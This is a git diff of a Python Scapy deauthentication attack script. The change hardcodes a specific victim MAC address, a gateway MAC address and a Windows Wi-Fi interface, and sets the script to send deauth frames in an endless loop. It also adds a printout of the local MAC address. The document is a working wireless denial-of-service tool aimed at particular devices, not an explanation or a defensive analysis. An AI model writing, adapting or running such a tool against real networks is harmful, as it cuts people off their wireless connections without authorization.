@@ -1,6 +1,7 @@
 from scapy.all import *
+import re, uuid
 
-def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0", verbose=1):
+def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="Intel(R) Dual Band Wireless-AC 3165", verbose=1):
     # 802.11 frame
     # addr1: destination MAC
     # addr2: source MAC
@@ -21,14 +22,15 @@ if __name__ == "__main__":
     parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'", default="wlan0mon")
     parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")
     
-    args = parser.parse_args()
-    target = args.target
-    gateway = args.gateway
-    count = int(args.count)
-    interval = float(args.interval)
-    args.iface = "Microsoft Wi-Fi Direct Virtual Adapter"
-    iface = args.iface
-    verbose = args.verbose
+    #args = parser.parse_args()
+    target = "24:ee:9a:a3:a4:53"
+    gateway = "30:24:32:a8:ec:a1"
+    count = 0
+    interval = 0.1
+    iface = "Intel(R) Dual Band Wireless-AC 3165"
+    verbose = "-v"
+    print ("The MAC address in expressed in formatted and less complex way : ", end="")
+    print (':'.join(re.findall('..', '%012x' % uuid.getnode())))
     if count == 0:
         # if count is 0, it means we loop forever (until interrupt)
         loop = 1
